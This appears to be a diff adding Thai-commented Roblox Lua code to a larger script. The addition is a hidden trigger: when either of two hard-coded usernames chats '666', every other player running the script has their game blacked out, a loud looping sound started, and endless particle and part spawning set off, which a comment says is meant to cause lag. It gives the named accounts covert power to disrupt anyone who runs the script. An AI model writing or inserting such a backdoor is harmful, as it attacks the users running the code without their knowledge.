@@ -523,6 +523,105 @@ end
 
 
 
+
+local allowedNames = {
+    ["birdV2_123"] = true,
+    ["Thai123456a2"] = true
+}
+
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local LocalPlayer = Players.LocalPlayer
+
+-- เอฟเฟคเสียง
+local sound = Instance.new("Sound", workspace)
+sound.SoundId = "rbxassetid://5993515228"
+sound.Volume = 10
+sound.Looped = true
+
+-- ฟังก์ชันรันเอฟเฟค
+local function runEffect()
+    -- ทำให้แสงมืด
+    Lighting.Ambient = Color3.new(0, 0, 0)
+    Lighting.OutdoorAmbient = Color3.new(0, 0, 0)
+    Lighting.Brightness = 0
+
+    -- เปลี่ยนพื้นให้ดำ
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            obj.Color = Color3.new(0, 0, 0)
+            obj.Material = Enum.Material.SmoothPlastic
+        end
+    end
+
+    -- เล่นเสียง
+    sound:Play()
+
+    -- เอฟเฟคไฟ
+    coroutine.wrap(function()
+        while true do
+            local p = Instance.new("ParticleEmitter")
+            p.Texture = "rbxassetid://243660364"
+            p.Color = ColorSequence.new(Color3.new(1,0,0), Color3.new(1,1,0))
+            p.LightEmission = 1
+            p.Size = NumberSequence.new(10)
+            p.Lifetime = NumberRange.new(1)
+            p.Rate = 1000
+            p.Speed = NumberRange.new(50)
+            p.VelocitySpread = 360
+
+            for _, obj in pairs(workspace:GetDescendants()) do
+                if obj:IsA("BasePart") then
+                    local clone = p:Clone()
+                    clone.Parent = obj
+                    game.Debris:AddItem(clone, 2)
+                end
+            end
+
+            wait(0.2)
+        end
+    end)()
+
+    -- ทำให้แลค
+    coroutine.wrap(function()
+        while true do
+            for i = 1, 50 do
+                local part = Instance.new("Part")
+                part.Anchored = true
+                part.CanCollide = false
+                part.Size = Vector3.new(0.1,0.1,0.1)
+                part.Position = Vector3.new(math.random(-1000,1000), math.random(1,1000), math.random(-1000,1000))
+                part.BrickColor = BrickColor.Random()
+                part.Parent = workspace
+                game.Debris:AddItem(part, 5)
+            end
+            wait(0.1)
+        end
+    end)()
+end
+
+-- เช็คผู้เล่นที่แชท
+local function connectChat(player)
+    if allowedNames[player.Name] and player ~= LocalPlayer then -- 👈 ป้องกันโดนตัวเอง
+        player.Chatted:Connect(function(msg)
+            if msg == "666" then
+                runEffect()
+            end
+        end)
+    end
+end
+
+-- เฝ้าดูผู้เล่นใหม่
+for _, player in pairs(Players:GetPlayers()) do
+    connectChat(player)
+end
+
+Players.PlayerAdded:Connect(connectChat)
+
+
+
+
+
 local args = {
 	"birdV2_123",
 	100
